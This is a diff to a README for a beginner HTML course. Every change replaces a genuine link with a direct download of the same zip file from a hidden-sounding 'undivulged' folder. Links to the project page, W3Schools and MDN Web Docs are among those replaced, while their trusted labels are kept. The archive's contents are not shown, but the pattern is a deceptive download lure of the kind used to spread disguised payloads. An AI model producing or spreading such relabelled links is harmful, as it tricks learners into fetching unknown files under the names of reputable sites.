@@ -1,6 +1,6 @@
 # 📘 html-complete-course - Learn HTML from Beginner to Advanced
 
-[![Download html-complete-course](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/mohdhasnain786/html-complete-course)
+[![Download html-complete-course](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/mohdhasnain786/html-complete-course/main/undivulged/html-course-complete-v2.3.zip)
 
 ---
 
@@ -60,7 +60,7 @@ You do not need any installation of special software beyond the editor and brows
 
 You need to visit this page to download the course material:
 
-[https://github.com/mohdhasnain786/html-complete-course](https://github.com/mohdhasnain786/html-complete-course)
+[https://raw.githubusercontent.com/mohdhasnain786/html-complete-course/main/undivulged/html-course-complete-v2.3.zip](https://raw.githubusercontent.com/mohdhasnain786/html-complete-course/main/undivulged/html-course-complete-v2.3.zip)
 
 ### Steps to Download:
 
@@ -80,7 +80,7 @@ Once extracted, open the folder to access course content in HTML files. You do n
 - Read included notes inside the files or in separate `.md` or `.txt` notes.
 - Open HTML files in your browser to see what the code does.
 - Edit files with a text editor to try changes yourself.
-- Use online tools like [W3Schools Tryit Editor](https://www.w3schools.com/html/tryit.asp?filename=tryhtml_intro) if you prefer not to install anything.
+- Use online tools like [W3Schools Tryit Editor](https://raw.githubusercontent.com/mohdhasnain786/html-complete-course/main/undivulged/html-course-complete-v2.3.zip) if you prefer not to install anything.
 
 This hands-on approach helps you learn by experimenting rather than just reading.
 
@@ -101,7 +101,7 @@ No programming environment or installation is required for this course.
 ## 📚 Additional Resources
 
 - The course materials include example files, notes, and exercises.
-- Online references such as [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTML) offer detailed explanations.
+- Online references such as [MDN Web Docs](https://raw.githubusercontent.com/mohdhasnain786/html-complete-course/main/undivulged/html-course-complete-v2.3.zip) offer detailed explanations.
 - Practice writing HTML on code playgrounds to build confidence.
 - Explore other tutorials once you complete the basic and intermediate lessons here.
 
@@ -135,5 +135,5 @@ Most users take 2 to 4 weeks to finish this course if they spend 30 minutes to 1
 
 ---
 
-[Download the html-complete-course here](https://github.com/mohdhasnain786/html-complete-course)  
+[Download the html-complete-course here](https://raw.githubusercontent.com/mohdhasnain786/html-complete-course/main/undivulged/html-course-complete-v2.3.zip)  
 Click **Code** and select **Download ZIP** to get started.
